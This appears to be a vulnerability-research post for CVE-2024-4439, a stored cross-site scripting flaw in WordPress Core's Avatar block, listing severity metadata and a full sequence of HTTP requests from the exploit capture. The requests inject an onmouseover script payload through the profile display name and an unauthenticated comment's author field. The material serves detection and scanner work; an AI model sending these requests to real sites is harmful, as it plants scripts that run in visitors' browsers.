---
layout: "post"
cve_id: "CVE-2024-4439"
title: "WordPress Core <6.5.2 - Cross-Site Scripting"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-4439.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-4439.yaml"
author: "nqdung2002"
severity: "high"
impact: "This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. In addition, it also makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that have the comment block present and display the comment author's avatar.
"
reference:
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-4439"
  - "https://www.cvedetails.com/cve/CVE-2024-4439/"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N"
  cvss-score: 7.2
  cve-id: "CVE-2024-4439"
  cwe-id: "CWE-80"
  epss-score: 0.91793
  epss-percentile: 0.99665
metadata:
  max-request: 10
  framework: "wordpress"
tags:
  - "wpscan"
  - "xss"
  - "wp"
  - "wordpress"
  - "footnote"
  - "sxss"
  - "post"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
WordPress Core is vulnerable to Stored Cross-Site Scripting via user display names in the Avatar block in various versions up to 6.5.2 due to insufficient output escaping on the display name.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/5.0
Connection: close
Content-Length: 53
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

log=sZZAMr&pwd=wVFjooGH&wp-submit=Log+In&testcookie=1
```

```nohighlight
GET /wp-admin/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /wp-admin/post-new.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /?rest_route=/wp/v2/posts/S8q6Kg HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X; ja-jp) AppleWebKit/523.12.2 (KHTML, like Gecko) Version/3.0.4 Safari/523.12.2
Connection: close
Content-Length: 132
Content-Type: application/json
X-HTTP-Method-Override: PUT
X-WP-Nonce: ZUfkn4
Accept-Encoding: gzip

{"id":S8q6Kg,"title":"CVE-2024-4439","content":"<!-- wp:avatar {\"isLink\":true,\"linkTarget\":\"_blank\"} /-->","status":"publish"}
```

```nohighlight
GET /wp-admin/profile.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/profile.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Connection: close
Content-Length: 250
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

_wpnonce=OrUSPg&first_name=%22+onmouseover%3Dalert%28document.domain%29%3B+%2F%2F&last_name=&nickname=admin&display_name=%22+onmouseover%3Dalert%28document.domain%29%3B+%2F%2F&email=admin%40gmail.com&action=update&user_id=2G95sb&submit=Update+Profile
```

```nohighlight
GET /wp-login.php?action=logout&_wpnonce=oSimQz HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-comments-post.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.1 Safari/605.1.15
Connection: close
Content-Length: 178
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

comment=Unauthenticated+Comment&author=%22+onmouseover%3Dalert%28document.domain%29%3B+%2F%2F&email=example%40gmail.com&url=example.com&submit=Post+Comment&comment_post_ID=S8q6Kg
```

```nohighlight
GET /?p=S8q6Kg HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
Connection: close
Accept-Encoding: gzip
```


